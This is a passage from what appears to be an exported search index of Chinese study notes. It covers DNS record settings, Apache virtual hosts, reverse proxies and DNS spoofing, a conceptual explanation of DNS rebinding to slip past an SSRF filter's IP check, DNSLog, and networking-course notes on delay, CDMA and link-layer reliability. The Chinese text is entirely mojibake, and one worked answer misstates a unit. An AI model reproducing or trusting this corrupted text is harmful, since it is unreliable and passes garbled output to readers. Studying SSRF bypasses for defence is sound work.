å°±æ˜¯è¦è§£æçš„åŸŸåï¼Œæ¯”å¦‚ç½‘ç«™æ ¹åŸŸåä¸ºkhaz.topï¼Œä¸»æœºè®°å½•@å³@khaz.topç­‰ä»·äºkhaz.top é€šå¸¸ä¼šå°†åŠ wwwå’Œä¸åŠ wwwçš„åŸŸåéƒ½è§£æåˆ°åŒä¸€ä¸ªipä¸Šã€‚ è®°å½•ç±»å‹ è§£æçº¿è·¯ å°±æ˜¯é€‰æ‹©å“ªä¸€ä¸ªISPçš„DNSæœåŠ¡å™¨ã€‚ è®°å½•å€¼ å°±æ˜¯åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚ TTL DNSç¼“å­˜æ—¶é—´ï¼Œå½“ä¿®æ”¹DNSè§£ææ—¶ï¼Œéœ€è¦ç»è¿‡TTLæ—¶é—´æ‰ä¼šç”Ÿæ•ˆã€‚ é—®é¢˜ å½“å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPæ—¶ï¼Œå¦‚æœé€šè¿‡IPåœ°å€æ¥è®¿é—®æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¼šè®¿é—®åˆ°å“ªä¸€ä¸ªåŸŸåï¼ˆç½‘ç«™ï¼‰å‘¢ï¼Ÿ ç­”æ¡ˆï¼š è™šæ‹Ÿä¸»æœºæŠ€æœ¯ å®ç°å¤šä¸ªç«™ç‚¹åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚ æ¯”å¦‚æœåŠ¡å™¨ä½¿ç”¨Apacheï¼Œé‚£ä¹ˆåœ¨Apacheçš„é…ç½®æ–‡ä»¶ä¸­åŠ å…¥VirtualHostå³å¯æ–°å¢è™šæ‹Ÿä¸»æœº DocumentRoot /var/www/acm ServerName acm.hdu.edu.cn DocumentRoot /var/www/html ServerName www.hdu.edu.cn ServerNameå¯¹åº”è¯·æ±‚å¤´çš„HOSTå­—æ®µï¼ŒDocumentRootå¯¹åº”çš„ç«™ç‚¹ç›®å½• è¿™æ ·HOSTä¸ºacm.hdu.edu.cnæ—¶ï¼Œè®¿é—®çš„å°±æ˜¯/var/www/acmä¸‹çš„acm.hdu.edu.cnç½‘ç«™ HOSTä¸ºwww.hdu.edu.cnæ—¶ï¼Œè®¿é—®çš„å°±æ˜¯/var/www/htmlä¸‹çš„www.hdu.edu.cnç½‘ç«™ è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œä¹Ÿå¯ä»¥å®ç°ä¸åŒç«¯å£å¯¹åº”ä¸åŒç«™ç‚¹ï¼Œåªè¦ä¿®æ”¹ä¸Šé¢çš„å³å¯ã€‚ åå‘ä»£ç†æŠ€æœ¯ æ¯ä¸ªç«™ç‚¹éƒ½åœ¨ä¸åŒçš„ä¸»æœºä¸Šï¼Œä½†éƒ½æ˜¯é€šè¿‡Eè¿™ä¸ªä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®çš„ã€‚ å®‰å…¨ç›¸å…³ DNSæ¬ºéª—æ”»å‡» DNSæ¬ºéª—æ”»å‡»ï¼ˆDNS spoofing attackï¼‰æ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…é€šè¿‡ç¯¡æ”¹æˆ–ä¼ªé€ åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰çš„è§£æç»“æœï¼Œå°†ç”¨æˆ·çš„è¯·æ±‚é‡å®šå‘åˆ°æ¶æ„ç½‘ç«™æˆ–è¿›è¡Œä¿¡æ¯çªƒå–ç­‰æ¶æ„è¡Œä¸ºã€‚è¿™ç§æ”»å‡»æ–¹å¼å¯èƒ½å¯¼è‡´ç”¨æˆ·è¢«å¼•å¯¼åˆ°è™šå‡çš„ç½‘ç«™ï¼Œä»è€Œé­å—é’“é±¼è¯ˆéª—ã€æ¶æ„è½¯ä»¶ä¸‹è½½ã€ä¸ªäººä¿¡æ¯æ³„éœ²ç­‰é£é™©ã€‚ DNS Rebinding æœ‰æ¼æ´çš„SSRFè¿‡æ»¤å™¨æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ è·å–è¾“å…¥çš„URLï¼Œä»è¯¥URLä¸­æå–HOSTï¼Œå¦‚æœæå–å‡ºæ¥çš„æ˜¯IPï¼Œé‚£ä¹ˆç›´æ¥è·³åˆ°ç¬¬ä¸‰æ­¥ï¼› å¯¹è¯¥HOSTè¿›è¡ŒDNSè§£æï¼Œè·å–åˆ°è§£æçš„IPï¼› æ£€æµ‹è¯¥IPæ˜¯å¦æ˜¯åˆæ³•çš„ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯ç§æœ‰IPç­‰ï¼ˆæ˜¯å°±ç›´æ¥ç»ˆæ­¢æµç¨‹ï¼‰ï¼› å¦‚æœIPæ£€æµ‹ä¸ºåˆæ³•çš„ï¼Œåˆ™è¿›å…¥CURLå‘åŒ…ï¼› æ¼æ´ç‚¹ DNSè§£æä¸€å…±åˆ†ä¸¤æ¬¡ï¼Œå…¶ä¸­ç¬¬ä¸€æ¬¡æ˜¯è‡³å…³é‡è¦çš„æœ‰æ•ˆæ€§æ£€æµ‹ï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯å…·ä½“å‘èµ·çš„è¯·æ±‚ã€‚æˆ‘ä»¬åˆ©ç”¨DNS RebindingæŠ€æœ¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ ¡éªŒIPçš„æ—¶å€™è¿”å›ä¸€ä¸ªåˆæ³•çš„IPï¼Œåœ¨çœŸå®å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œè¿”å›æˆ‘ä»¬çœŸæ­£æƒ³è¦è®¿é—®çš„å†…ç½‘IPå³å¯ã€‚ å®ç°æ–¹å¼ åŒä¸€ä¸ªåŸŸåç»‘å®šä¸¤æ¡TTLéƒ½æ˜¯0çš„Aè®°å½•ï¼Œä¸è¿‡è¿™æ ·DNSè§£ææ˜¯éšæœºçš„ï¼Œä¸å¤Ÿç¨³å®š é€šè¿‡è‡ªå»ºDNSæœåŠ¡å™¨ï¼Œç¨³å®šæ§åˆ¶è§£æè¿”å›ç»“æœ DNS Log nsè®°å½•æŒ‡å‘è‡ªå»ºçš„DNSæœåŠ¡å™¨ï¼Œç„¶åå½“ç›®æ ‡ä¸»æœºå‘èµ·DNS Queryæ—¶ï¼Œè‡ªå»ºçš„DNSæœåŠ¡å™¨å°±è®°å½•ä¸‹è¯¥è¯·æ±‚ã€‚ä»ä¸‹å›¾ä¸­å¯ä»¥çœ‹åˆ°å‘NSæœåŠ¡å™¨å‘èµ·DNSè¯·æ±‚çš„ä¸ºç”¨æˆ·è®¾ç½®çš„DNSæœåŠ¡å™¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæŸ¥çœ‹DNSLogè®°å½•çš„IPä¸æ˜¯ç›®æ ‡ä¸»æœºçš„åŸå› ã€‚ å¸¸ç”¨å‘½ä»¤ nslookup/dig https://blog.csdn.net/weixin_42426841/article/details/115364502 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:09:32 "},"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/æ¹–ç§‘å¤§mooc.html":{"url":"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/æ¹–ç§‘å¤§mooc.html","title":"è®¡ç®—æœºç½‘ç»œMOOC","keywords":"","body":"ç¬¬ä¸€ç«  å› ç‰¹ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µ ISP äº’è”ç½‘æ ‡å‡†åˆ¶å®š å¸¸ç”¨çš„æ€§èƒ½æŒ‡æ ‡ é€Ÿç‡ ç°å®ç”Ÿæ´»ä¸­çš„â€œå®½å¸¦â€ å› ä¸ºISPæä¾›çš„çº¿è·¯å¸¦å®½ä½¿ç”¨çš„å•ä½æ˜¯bitï¼Œè€Œä¸€èˆ¬ä¸‹è½½è½¯ä»¶æ˜¾ç¤ºçš„æ˜¯å­—èŠ‚ï¼ˆ1å­—èŠ‚ï¼8æ¯”ç‰¹ï¼‰ï¼Œæ‰€ä»¥è¦é€šè¿‡æ¢ç®—ï¼Œæ‰èƒ½å¾—å®é™…å€¼ã€‚ ç†è®ºä¸Šï¼š2Mï¼ˆå³2Mb/sï¼‰å®½å¸¦ç†è®ºé€Ÿç‡æ˜¯ï¼š256KB/sï¼ˆå³2048Kb/sï¼‰ï¼Œå®é™…é€Ÿç‡å¤§çº¦ä¸º80--200KB/sï¼› å¸¦å®½--å‘é€é€Ÿç‡ï¼Œæ•°æ®ç‡ ååé‡ å®é™…æ•°æ®é‡ æ—¶å»¶ æŒ‡æ•°æ®ï¼ˆä¸€ä¸ªæŠ¥æ–‡æˆ–åˆ†ç»„ï¼Œç”šè‡³æ¯”ç‰¹ï¼‰ä»ç½‘ç»œï¼ˆæˆ–é“¾è·¯ï¼‰çš„ä¸€ç«¯ä¼ é€åˆ°å¦ä¸€ç«¯æ‰€éœ€çš„æ—¶é—´ã€‚ ç»„æˆ ä¿¡é“é€Ÿç‡ æ³¨æ„: ä»¥ä¸‹è¯´æ³•æ˜¯é”™è¯¯çš„ï¼š â€œåœ¨é«˜é€Ÿé“¾è·¯ï¼ˆæˆ–é«˜å¸¦å®½é“¾è·¯ï¼‰ä¸Šï¼Œæ¯”ç‰¹ä¼šä¼ é€å¾—æ›´å¿«äº›â€ã€‚ æ€»æ—¶å»¶ = å¤„ç†æ—¶å»¶ + æ’é˜Ÿæ—¶å»¶ + å‘é€æ—¶å»¶ + ä¼ æ’­æ—¶å»¶ ä¸Šè¿°æ–¹æ³•åªæ˜¯æé«˜äº†æ•°æ®çš„å‘é€é€Ÿç‡ï¼Œå‡å°‘äº†ä¼ æ’­æ—¶å»¶ã€‚ æ—¶å»¶ä¸ç½‘ç»œåˆ©ç”¨ç‡ ä¾‹å­ï¼šå‡å®šç½‘ç»œçš„åˆ©ç”¨ç‡è¾¾åˆ°äº†90%ã€‚è¯•ä¼°ç®—ä¸€ä¸‹ç°åœ¨çš„ç½‘ç»œæ—¶å»¶æ˜¯å®ƒçš„æœ€å°å€¼çš„å¤šå°‘å€ï¼Ÿ D=D0/(1-U)=D0/(1-90%)=10D0;æ˜¯æœ€å°å€¼çš„10å€; æ³¨ï¼šç½‘ç»œæ—¶å»¶æœ€å°å€¼ä¸ºç½‘ç»œç©ºé—²æ—¶çš„æ—¶å»¶D0 æ—¶å»¶å¸¦å®½ç§¯--é“¾è·¯ä¸Šçš„æ¯”ç‰¹æ•°ç›® ç¬¬ä¸‰ç« 20.å‡å®š1kmé•¿çš„CSMA/CDç½‘ç»œçš„æ•°æ®ç‡ä¸º1Gbit/sã€‚è®¾ä¿¡å·åœ¨ç½‘ç»œä¸Šçš„ä¼ è¾“é€Ÿç‡ä¸º200000km/s.æ±‚èƒ½å¤Ÿä½¿ç”¨æ­¤åè®®çš„æœ€çŸ­å¸§é•¿ã€‚ ç­”ï¼šå¯¹äº1kmç”µç¼†ï¼Œå•ç¨‹ä¼ æ’­æ—¶é—´ä¸º1/200000=5usï¼Œæ¥å›è·¯ç¨‹ä¼ æ’­æ—¶é—´ä¸º10usï¼Œä¸ºäº†èƒ½å¤ŸæŒ‰ç…§CSMA/CDå·¥ä½œï¼Œæœ€å°å¸§çš„å‘å°„æ—¶é—´ä¸èƒ½å°äº10usï¼Œä»¥1GB/sé€Ÿç‡å·¥ä½œï¼Œ10uså¯ä»¥å‘é€çš„æ¯”ç‰¹æ•°ç­‰äº10*10^-6*10^9=10^4sï¼Œå› æ­¤æœ€çŸ­å¸§æ˜¯10000ä½æˆ–1250å­—èŠ‚é•¿ æœ€çŸ­å¸§é•¿ç›¸å½“äºé“¾è·¯ä¸Šçš„æ¯”ç‰¹æ•°ç›® å¾€è¿”æ—¶é—´RTT è¡¨ç¤ºä»å‘é€æ–¹å‘é€å®Œæ•°æ®ï¼Œåˆ°å‘é€æ–¹æ”¶åˆ°æ¥è‡ªæ¥æ”¶æ–¹çš„ç¡®è®¤æ€»å…±ç»å†çš„æ—¶é—´ã€‚ åè®®ä¸æœåŠ¡ å®ä½“ (entity) ï¼šè¡¨ç¤ºä»»ä½•å¯å‘é€æˆ–æ¥æ”¶ä¿¡æ¯çš„ç¡¬ä»¶æˆ–è½¯ä»¶è¿›ç¨‹ã€‚ æ¯”å¦‚è¯´è½¯ä»¶è¿›ç¨‹ï¼Œç½‘å¡ åè®®ï¼šæ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“è¿›è¡Œé€šä¿¡çš„è§„åˆ™çš„é›†åˆã€‚ å¯¹ç­‰å®ä½“æŒ‡çš„æ˜¯åœ¨åŒä¸€å±‚ï¼ˆå¯¹ç­‰å±‚ï¼‰ä¸Šçš„å®ä½“å¦‚ä¸Šå›¾çš„Aä¸Få°±æ˜¯å¯¹ç­‰å®ä½“ã€‚ æ§åˆ¶åº”ç”¨å±‚é€šä¿¡çš„å°±æ˜¯HTPPåè®®ç­‰ã€‚ ä¸‰è¦ç´  è¯­æ³•ï¼šç¡®å®šé€šä¿¡åŒæ–¹\"å¦‚ä½•è®²\"ï¼Œå®šä¹‰äº†æ•°æ®æ ¼å¼ï¼Œç¼–ç å’Œä¿¡å·ç”µå¹³ç­‰ã€‚ è¯­ä¹‰ï¼šç¡®å®šé€šä¿¡åŒæ–¹\"è®²ä»€ä¹ˆ\"ï¼Œå®šä¹‰äº†ç”¨äºåè°ƒåŒæ­¥å’Œå·®é”™å¤„ç†ç­‰æ§åˆ¶ä¿¡æ¯ã€‚ åŒæ­¥ï¼šç¡®å®šé€šä¿¡åŒæ–¹\"è®²è¯çš„æ¬¡åº\"ï¼Œå®šä¹‰äº†é€Ÿåº¦åŒ¹é…å’Œæ’åºç­‰ã€‚ åè®®ä¸æœåŠ¡ äºŒè€…æ˜¯ç›¸äº’ä¾å­˜çš„ã€‚ï¼ˆæ³¨æ„æœ€åº•å±‚ç‰©ç†å±‚çš„ä¸åŒä¹‹å¤„ã€‚ï¼‰ è¦å®ç°æœ¬å±‚åè®®ï¼Œéœ€è¦ä½¿ç”¨ä¸‹å±‚æ‰€æä¾›çš„æœåŠ¡ï¼ˆé€šè¿‡æœåŠ¡åŸè¯­è·å¾—ï¼‰ åœ¨åè®®çš„æ§åˆ¶ä¸‹ï¼Œä¸¤ä¸ªå¯¹ç­‰å®ä½“é—´çš„é€šä¿¡ä½¿å¾—æœ¬å±‚èƒ½å¤Ÿå‘ä¸Šä¸€å±‚æä¾›æœåŠ¡ã€‚ æ‰€ä»¥åè®®æ˜¯â€œæ°´å¹³çš„â€ï¼ŒæœåŠ¡æ˜¯â€œå‚ç›´çš„â€ï¼Œå®ä½“çœ‹å¾—è§ç›¸é‚»ä¸‹å±‚æ‰€æä¾›çš„æœåŠ¡ï¼Œä½†å¹¶ä¸çŸ¥é“å®ç°è¯¥æœåŠ¡çš„å…·ä½“åè®®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸‹é¢çš„åè®®å¯¹ä¸Šé¢çš„å®ä½“æ˜¯\"é€æ˜\"çš„ã€‚ SDU å±‚ä¸å±‚ä¹‹é—´äº¤æ¢çš„æ•°æ®çš„å•ä½ç§°ä¸ºæœåŠ¡æ•°æ®å•å…ƒ SDU PDU å¯¹ç­‰å±‚æ¬¡ä¹‹é—´ä¼ é€çš„æ•°æ®åŒ…ç§°ä¸ºè¯¥å±‚çš„åè®®æ•°æ®å•å…ƒã€‚ æœåŠ¡è®¿é—®ç‚¹ åœ¨åŒä¸€ç³»ç»Ÿä¸­ç›¸é‚»ä¸¤å±‚çš„å®ä½“äº¤æ¢ä¿¡æ¯çš„é€»è¾‘æ¥å£ï¼Œç”¨äºåŒºåˆ†ä¸åŒçš„æœåŠ¡ç±»å‹ã€‚ æ•°æ®é“¾è·¯å±‚çš„æœåŠ¡è®¿é—®ç‚¹ä¸ºå¸§çš„â€œç±»å‹â€å­—æ®µã€‚ ç½‘ç»œå±‚çš„æœåŠ¡è®¿é—®ç‚¹ä¸ºIPæ•°æ®æŠ¥é¦–éƒ¨ä¸­çš„â€œåè®®å­—æ®µâ€ã€‚è¿è¾“å±‚çš„æœåŠ¡è®¿é—®ç‚¹ä¸ºâ€œç«¯å£å·â€ã€‚ è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„ å¤ç”¨å’Œåˆ†ç”¨ ä¸€èˆ¬æ¥è¯´ï¼Œåº”ç”¨å±‚ä¼šæœ‰æ¯”è¾ƒå¤šçš„è¿›ç¨‹åŒæ—¶åœ¨è¿è¡Œï¼ŒåŒæ—¶å’Œå¤–éƒ¨ç½‘ç»œæœ‰æ•°æ®çš„äº¤äº’ï¼Œå°±å¥½æ¯”ä¸€æ¡é“è·¯æœ‰å¤šä¸ªè½¦é“æœ‰è½¦è¾†åœ¨è¡Œé©¶ã€‚ å¯æ˜¯åœ¨åº•å±‚ï¼Œæ•°æ®ä¼ è¾“æ˜¯ä¸²è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯å•è½¦é“ã€‚ å½“å¤šè½¦é“çš„è½¦è¦ç»è¿‡å•è½¦é“ï¼Œé‡‡å–çš„æ–¹æ³•æ˜¯åœ¨å•è½¦é“å…¥å£è®¾ç«‹å¡å­ï¼Œæ¯ä¸ªè½¦é“çš„è½¦åœ¨å¡å­å‰æ’é˜Ÿï¼Œä¾æ¬¡é€šè¿‡å¡å­è¿›å…¥å•è½¦é“ã€‚ æ’é˜Ÿçš„è¿‡ç¨‹å°±æ˜¯å¤ç”¨ï¼ˆå¤š â†’ ä¸€ï¼‰ï¼Œåä¹‹å°±æ˜¯åˆ†ç”¨æˆ–è€…å«è§£å¤ç”¨ï¼ˆä¸€ â†’ å¤šï¼‰ ç¬¬äºŒç«  ç‰©ç†å±‚åŸºæœ¬æ¦‚å¿µ ä½œç”¨ åœ¨è¿æ¥å„ç§è®¡ç®—æœºçš„ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµã€‚ æ³¨æ„ï¼šä¼ è¾“åª’ä½“ä¸å±äºè®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„ï¼ˆç½‘ç»œä½“ç³»ç»“æ„ï¼šç½‘ç»œå„å±‚åŠå…¶åè®®çš„é›†åˆï¼‰ï¼Œç›¸å½“äºç¬¬0å±‚å³ç‰©ç†å±‚çš„ä¸‹ä¸€å±‚ã€‚ ç‰¹ç‚¹ æœºæ¢°ç‰¹æ€§ æŒ‡æ˜ä¼ è¾“åª’ä½“çš„å„ç§è§„æ ¼ ç”µæ°”ç‰¹æ€§ æŒ‡æ˜æ¥å£ç”µç¼†ä¸Šçš„ç”µå‹èŒƒå›´ åŠŸèƒ½ç‰¹æ€§ æŒ‡æ˜æ¥å£ç”µç¼†å„æ¡ä¿¡å·çº¿ï¼ˆç”µå‹èŒƒå›´ï¼‰çš„ä½œç”¨ è¿‡ç¨‹ç‰¹æ€§ æŒ‡æ˜æ¯ç§åŠŸèƒ½çš„äº‹ä»¶å‘ç”Ÿé¡ºåº ä¼ è¾“åª’ä½“çš„ç§ç±» ä¿¡é“å¤ç”¨æŠ€æœ¯ ç›®çš„ï¼š ä¸ºäº†é€šè¿‡å…±äº«ä¿¡é“,æœ€å¤§é™åº¦æé«˜ä¿¡é“åˆ©ç”¨ç‡ã€‚ é¢‘åˆ†å¤ç”¨ ç”¨æˆ·åŒæ—¶å ç”¨ä¸åŒçš„é¢‘å¸¦èµ„æºå¹¶è¡Œé€šä¿¡ æ—¶åˆ†å¤ç”¨ ç”¨æˆ·åˆ†æ—¶å ç”¨ç›¸åŒçš„é¢‘å¸¦èµ„æºå¹¶è¡Œé€šä¿¡ æ³¢åˆ†å¤ç”¨ ä¸é¢‘åˆ†å¤ç”¨ä¸€æ ·ï¼Œåªæ˜¯ä¼ è¾“æ•°æ®çš„ä»‹è´¨å˜ä¸ºå…‰æ³¢ ç åˆ†å¤ç”¨ ç”¨æˆ·åŒæ—¶å ç”¨ç›¸åŒçš„é¢‘å¸¦è¿›è¡Œé€šä¿¡ ç ç‰‡ï¼šæ¯ä¸ªæ¯”ç‰¹æ—¶é—´åˆ’åˆ†ä¸ºmä¸ªæ›´çŸ­çš„æ—¶é—´ç‰‡ï¼Œç§°ä¸ºç ç‰‡ï¼ˆChipï¼‰ æŸä¸ªç«™è¦å‘é€æ¯”ç‰¹1ï¼Œåˆ™å‘é€å®ƒè‡ªå·±çš„mæ¯”ç‰¹ç ç‰‡åºåˆ— æŸä¸ªç«™è¦å‘é€æ¯”ç‰¹0ï¼Œåˆ™å‘é€å®ƒè‡ªå·±çš„mæ¯”ç‰¹ç ç‰‡åºåˆ—çš„åç ã€‚ ç ç‰‡å‘é‡ æ ¹æ®ç ç‰‡åºåˆ—ç”Ÿæˆã€‚1â†’1ï¼Œ0â†’-1 å‡è®¾ç ç‰‡åºåˆ—ä¸º110 åˆ™ç ç‰‡å‘é‡ä¸ºï¼ˆ1ï¼Œ1ï¼Œ-1ï¼‰ è§„æ ¼åŒ–å†…ç§¯ å³å¼ä¸­çš„Aiï¼ŒBiæŒ‡çš„æ˜¯ç ç‰‡å‘é‡ ç”Ÿæ´»ä¸­çš„ä¾‹å­ è§„æ ¼åŒ–å†…ç§¯å¾—åˆ°ï¼ˆ1ï¼Œ-1ï¼Œ1ï¼‰å¯¹åº”çš„ç ç‰‡åºåˆ—å°±æ˜¯101ï¼Œå³æ‰‹æœºAæ”¶åˆ°æ¯”ç‰¹ä¸²101. ç å…ƒç‡ä¸æ•°æ®ç‡ å¥ˆå¼å‡†åˆ™å¾—åˆ°æœ€é«˜ç å…ƒé€Ÿç‡ï¼ˆæ³¢ç‰¹ç‡ï¼‰ä¸º20000ç å…ƒ/ç§’ï¼Œç å…ƒçš„æŒ¯å¹…åˆ†ä¸º16ä¸ªç­‰çº§ï¼Œå³ä¿¡å·çŠ¶æ€æ•°ï¼ˆå¯è°ƒåˆ¶å‡ºçš„ä¸åŒåŸºæœ¬æ³¢å½¢æˆ–ç å…ƒæ•°é‡ï¼‰ä¸º16ï¼Œåˆ™ä¸€ä¸ªç å…ƒå¯æºå¸¦çš„æ¯”ç‰¹æ•°é‡ä¸ºlog216=4ï¼Œæ‰€ä»¥æœ€é«˜æ•°æ®ç‡ä¸º20000*4æ¯”ç‰¹/ç§’ã€‚ å¥ˆå¼å‡†åˆ™å’Œé¦™å†œå…¬å¼ è®¡ç®— æé™ä¿¡æ¯ä¼ è¾“é€Ÿç‡==ç å…ƒä¼ è¾“é€Ÿç‡ï¼ˆæ³¢ç‰¹ç‡ï¼‰*ç å…ƒæºå¸¦çš„æ¯”ç‰¹æ•° ç å…ƒæºå¸¦çš„æ¯”ç‰¹æ•°ï¼š1og2n //nä¸ºç å…ƒçš„æŒ¯å¹…æˆ–è€…ä¿¡å·çŠ¶æ€æ•°ï¼ˆå¯è°ƒåˆ¶å‡ºçš„ä¸åŒåŸºæœ¬æ³¢å½¢æˆ–ç å…ƒæ•°é‡ï¼‰ é¢‘ç‡ï¼ä¼ æ’­é€Ÿç‡/æ³¢é•¿ é¢‘å¸¦å®½åº¦=æœ€é«˜é¢‘ç‡-æœ€ä½é¢‘ç‡ ç¬¬ä¸‰ç« 16.æ•°æ®ç‡ä¸º10Mb/sçš„ä»¥å¤ªç½‘åœ¨ç‰©ç†åª’ä½“ä¸Šçš„ç å…ƒä¼ è¾“é€Ÿç‡æ˜¯å¤šå°‘ç å…ƒ/ç§’ï¼Ÿ ç­”ï¼šç å…ƒä¼ è¾“é€Ÿç‡å³ä¸ºæ³¢ç‰¹ç‡ï¼Œä»¥å¤ªç½‘ä½¿ç”¨æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼Œè¿™å°±æ„å‘³ç€å‘é€çš„æ¯ä¸€ä½éƒ½æœ‰ä¸¤ä¸ªä¿¡å·å‘¨æœŸï¼ˆä¸€ä¸ªç å…ƒæºå¸¦0.5ä¸ªæ¯”ç‰¹ï¼‰ï¼Œå› æ­¤æ³¢ç‰¹ç‡æ˜¯æ•°æ®ç‡çš„ä¸¤å€ï¼Œå³20Mç å…ƒ/ç§’ ç¬¬ä¸‰ç«  æ•°æ®é“¾è·¯å±‚ ç›®çš„ æ•°æ®é“¾è·¯å±‚åšæˆå¯é çš„é“¾è·¯å±‚æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚ å¯é çš„é“¾è·¯å±‚çš„ä¼˜ç‚¹å’Œç¼ºç‚¹å–å†³äºæ‰€åº”ç”¨çš„ç¯å¢ƒï¼šå¯¹äºå¹²æ‰°ä¸¥é‡çš„ä¿¡é“ï¼Œå¯é çš„é“¾è·¯å±‚å¯ä»¥å°†é‡ä¼ èŒƒå›´çº¦æŸåœ¨å±€éƒ¨é“¾è·¯ï¼Œé˜²æ­¢å…¨ç½‘ç»œçš„ä¼ è¾“æ•ˆç‡å—æŸï¼›å¯¹äºä¼˜è´¨ä¿¡é“ï¼Œé‡‡ç”¨å¯é çš„é“¾è·¯å±‚ä¼šå¢å¤§èµ„æºå¼€é”€ï¼Œå½±å“ä¼ è¾“æ•ˆç‡ã€‚ é€æ˜ä¼ è¾“ æ·»åŠ å¸§é¦–éƒ¨å’Œå¸§å°¾éƒ¨ï¼šå¸§å®šç•Œç¬¦ï¼Œä¸ºäº†åŒºåˆ†æ¯”ç‰¹æµä¸­çš„å¸§ åŒºåˆ†è½½è·ä¸­çš„æ•°æ®ä¸å¸§å®šç•Œç¬¦å’Œæ§åˆ¶ç¬¦ï¼šESCï¼ˆæ§åˆ¶ç¬¦ï¼‰+FLAGï¼ˆå¸§å®šç•Œç¬¦ï¼‰ å­—ç¬¦å¡«å……æ³•ï¼šåœ¨å­—ç¬¦å‰åŠ ä¸Šè½¬ä¹‰å­—ç¬¦ESCï¼ˆ11100000ï¼‰ é›¶æ¯”ç‰¹å¡«å……æ³•ï¼šæ¯äº”ä¸ªè¿ç»­æ¯”ç‰¹1åé¢æ’å…¥ä¸€ä¸ªæ¯”ç‰¹0 å·®é”™æ§åˆ¶ ç›®çš„ï¼šä¸ºäº†æ£€æµ‹æ¯”ç‰¹åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦äº§ç”Ÿè¯¯ç ï¼ˆæ¯”ç‰¹å·®é”™ï¼‰ã€‚ å¦‚ä½•æ£€æµ‹ï¼š å¥‡å¶æ ¡éªŒ CRCï¼ˆå¾ªç¯å†—ä½™æ ¡éªŒï¼‰ å¯é ä¼ è¾“ ä¿è¯æ¥æ”¶æ–¹èƒ½å¤Ÿæ­£ç¡®æ”¶åˆ°å‘é€æ–¹å‘é€çš„æ‰€æœ‰æ•°æ®ã€‚Â· ä¼ è¾“ä¸­å‡ºç°çš„å·®é”™ è¯¯ç ï¼šæ¯”ç‰¹é”™è¯¯ã€‚ ä¸¢å¤±ï¼šè·¯ç”±å™¨çš„è¾“å…¥é˜Ÿåˆ—æ»¡æ—¶ï¼Œä¼šä¸»åŠ¨ä¸¢å¼ƒæ•°æ®åˆ†ç»„ï¼Œäº¦æˆ–æ˜¯æ¥æ”¶æ–¹æ”¶åˆ°äº†é‡å¤çš„æ•°æ®åˆ†ç»„æ—¶ã€‚ ä¹±åºï¼šæ•°æ®åˆ†ç»„é€šè¿‡ä¸åŒçš„è·¯ç”±è·¯å¾„ï¼Œå¯¼è‡´åˆ°è¾¾æ¥æ”¶æ–¹çš„æ—¶é—´ä¸åŒã€‚ é‡å¤ï¼šæ•°æ®åˆ†ç»„é€šè¿‡çš„è·¯ç”±è·¯å¾„å µå¡ï¼Œå¯¼è‡´å‘é€æ–¹æ²¡æœ‰åŠæ—¶æ”¶åˆ°ç¡®è®¤åˆ†ç»„ï¼Œäº¦æˆ–æ˜¯ç¡®è®¤åˆ†ç»„åœ¨ä¼ è¾“çš„è¿‡ç¨‹ ä¸­ä¸¢å¤±ï¼Œå‘é€æ–¹å°±ä¼šè¶…æ—¶é‡å‘ã€‚ æœºåˆ¶ å¦è®¤æœºåˆ¶ï¼šå½“æ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®å¹¶è¿›è¡Œå·®é”™æ£€æµ‹åï¼Œå¦‚æœå‘ç°å‡ºç°æ•°æ®è¯¯ç ï¼Œå°±å‘å‘é€æ–¹å‘é€å¦è®¤åˆ†ç»„ï¼Œä»¥è®©å‘é€æ–¹é‡å‘æ•°æ®ã€‚ è¶…æ—¶é‡å‘æœºåˆ¶ï¼šå‘é€æ–¹å‘é€æ•°æ®åï¼Œå°±å¼€å§‹è®¡æ—¶RTOï¼Œå¦‚æœè¶…è¿‡RTOæ—¶é—´è¿˜æ²¡æœ‰æ¥æ”¶åˆ°ç¡®è®¤/å¦è®¤åˆ†ç»„ï¼Œå°±è‡ªåŠ¨é‡å‘å¯¹åº”çš„æ•°æ®åˆ†ç»„ã€‚ æ»‘åŠ¨çª—å£æœºåˆ¶ï¼šå‘é€çª—å£å’Œæ¥æ”¶çª—å£çš„å¤§å°å†³å®šäº†ä¸€æ¬¡èƒ½å¤Ÿå‘é€æˆ–æ¥æ”¶æ•°æ®åˆ†ç»„çš„æœ€å¤§æ•°é‡ï¼Œå¹¶ä¸”åªæœ‰æˆåŠŸå‘é€æˆ–æ¥æ”¶çª—å£å¤§å°çš„æ•°æ®åˆ†ç»„ï¼Œæ‰èƒ½å¤Ÿæ»‘åŠ¨çª—å£ï¼Œå³æ‰èƒ½å¤Ÿå‘é€æˆ–æ¥æ”¶ä¸‹ä¸€æ¬¡çš„æ•°æ®åˆ†ç»„ã€‚ ä¼ è¾“åè®® 